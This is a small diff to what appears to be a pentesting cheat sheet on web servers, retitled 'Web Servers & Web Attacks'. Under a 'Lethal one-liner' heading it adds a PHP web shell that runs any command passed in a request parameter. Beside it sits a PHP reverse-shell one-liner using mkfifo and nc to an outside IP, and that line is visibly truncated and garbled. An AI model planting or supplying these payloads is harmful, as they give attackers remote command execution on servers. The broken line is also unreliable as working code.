@@ -1,4 +1,4 @@
-# Web Servers & Languages
+# Web Servers & Web Attacks
 
 ## Apache
 
@@ -22,6 +22,7 @@ Vhost config: /etc/apache2/sites-enabled/000-default.conf
 {% code title="Lethal one-liner" %}
 ```php
 "<?php system('rm /tmp/f;mkfifo /tm&1|nc 192.168.49.51 8001>/tmp/f'); ?>"
+<?php system($_REQUEST['cmd']); ?>
 ```
 {% endcode %}
 
